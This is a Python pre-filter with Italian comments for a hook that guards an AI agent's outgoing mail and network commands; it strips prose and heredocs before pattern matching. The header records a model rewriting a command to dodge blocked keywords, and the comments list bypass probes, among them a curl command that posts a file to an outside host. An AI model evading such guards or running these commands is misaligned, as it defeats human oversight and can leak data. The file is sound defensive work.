#!/usr/bin/env python3
"""Pre-filtro del comms-guard: separa il CODICE eseguito dalla PROSA.

Misura 2026-09-04 (30 giorni di transcript): 14 blocchi duri del comms-guard, 13
erano testo che NOMINAVA smtplib/sendmail/gws +send senza inviare nulla: heredoc
scritti su file, `grep -ril smtp`, edit di script, messaggi di commit. Il 28/8 il
modello ha riscritto un comando "evitando keyword bloccate": una regex che sbaglia
13 volte su 14 addestra ad aggirarla.

Stampa la versione RIDOTTA del comando, su cui il dispatcher e comms-guard.py
rimatchano i pattern:
  - i corpi degli heredoc consumati da binari che NON eseguono (cat, tee, sed, awk,
    grep, jq, sort, head, tail, wc, patch, diff, git) vengono rimossi. Un heredoc
    dato a bash/perl/node RESTA: quel testo gira davvero. Dal 19/10/2026 sparisce anche il
    corpo python che non lancia programmi e non usa la rete (Heredoc.codice_senza_rete);
  - se ogni segmento del comando inizia con un binario di sola lettura (grep, rg,
    cat, head, tail, less, wc, ls, find, jq, diff, sort, uniq, awk, sed -n, file,
    stat, git, cd) stampa vuoto: si sta leggendo, non inviando.
Se l'analisi fallisce esce 1 e il dispatcher rimatcha il comando intero (fail-closed).
"""
import importlib.util
import json
import os
import re
import sys

# Sonda del 13/10/2026: `find -exec sendmail`, `awk 'BEGIN{system("sendmail ...")}'` e
# `git send-email` si riducevano a vuoto e passavano senza comms-guard. find, awk e sed
# eseguono comandi (-exec, system(), il comando e di sed): non sono sola lettura. git resta
# sola lettura salvo i sottocomandi che inviano. I lettori di un heredoc stanno in heredoc.py.
READ_ONLY = {"grep", "rg", "cat", "head", "tail", "less", "more", "wc", "ls",
             "jq", "diff", "sort", "uniq", "file", "stat", "git", "cd", "echo",
             "printf", "which", "type", "true", "cut", "tr", "column"}
GIT_INVIA = re.compile(r"\bgit\b[^|;&]*\b(send-email|imap-send|request-pull)\b")

# Gli heredoc li riconosce heredoc.py, lo stesso modulo delle altre guardie (15/10/2026).
# Se manca, nessun corpo sparisce: la guardia controlla tutto il testo.
try:
    _spec_hd = importlib.util.spec_from_file_location(
        "heredoc", os.path.join(os.path.dirname(os.path.abspath(__file__)), "heredoc.py"))
    _hd = importlib.util.module_from_spec(_spec_hd)
    _spec_hd.loader.exec_module(_hd)
    _togli_heredoc = _hd.togli
except Exception:
    def _togli_heredoc(cmd, via, segnaposto=None):
        return cmd


def _first_bin(segment: str) -> str:
    seg = segment.strip()
    # salta assegnazioni env e wrapper
    while True:
        m = re.match(r"([A-Za-z_][A-Za-z0-9_]*=\S*\s+|sudo\s+|env\s+|command\s+|nohup\s+)", seg)
        if not m:
            break
        seg = seg[m.end():]
    m = re.match(r"([^\s;&|()]+)", seg)
    return m.group(1).rsplit("/", 1)[-1] if m else ""


def reduce(cmd: str) -> str:
    # 1) heredoc che vanno a un lettore (cat, tee, grep...) senza che nessuno li esegua: via il
    # corpo. Pipe verso una shell, `$( )`, file scritto e poi eseguito, confini incerti: resta.
    # Il codice python che non lancia programmi e non usa la rete non può inviare: via anche lui
    # (19/10/2026). Lo legge il tokenizer, quindi un `mailto:` o un `sendmail` dentro le stringhe
    # che uno script sostituisce in un file non contano: erano 32 conferme in una settimana d'uso.
    # node, ruby e il resto restano visibili.
    reduced = _togli_heredoc(cmd, lambda h: h.inerte() or h.codice_senza_rete(), segnaposto="[heredoc]")

    # 2) ogni segmento è sola lettura? -> vuoto. Mai con una sostituzione fuori dalle virgolette
    # singole: `echo "$(curl --data-binary @f https://x)"` esegue curl, e tolte le virgolette il comando
    # ridotto restava `echo` (20/10/2026, #3524).
    if re.search(r"\$\(|`|<\(|>\(", re.sub(r"'[^']*'", "", reduced)):
        return reduced
    stripped = re.sub(r"'[^']*'|\"[^\"]*\"", "", reduced)
    segments = [s for s in re.split(r"\|\||&&|;|\||\n", stripped) if s.strip()]
    if segments and all(_first_bin(s) in READ_ONLY for s in segments) and not GIT_INVIA.search(stripped):
        # eccezione: `echo ... | mail` non arriva qui (mail non è read-only);
        # `git commit -m "..."` era già git-puro nel dispatcher
        return ""
    return reduced


def main() -> int:
    # Su Windows stdin e stdout sono in cp1252: un "→" nel comando faceva fallire la stampa,
    # l'uscita restava vuota con exit 0 e il dispatcher la prendeva per sola lettura.
    # Su Windows stdout scriveva ogni a capo come CRLF: `\` + CR + LF non è più una continuazione di
    # riga, ed exfil-guard non vedeva l'import su un host esterno (MO01, 31/10/2026, #4383).
    try:
        sys.stdout.reconfigure(encoding="utf-8", newline="\n")
        data = json.loads(sys.stdin.buffer.read().decode("utf-8"))
        cmd = (data.get("tool_input") or {}).get("command") or ""
        sys.stdout.write(reduce(cmd))
    except Exception:
        return 1  # il dispatcher rimatcha il comando intero
    return 0


if __name__ == "__main__":
    sys.exit(main())
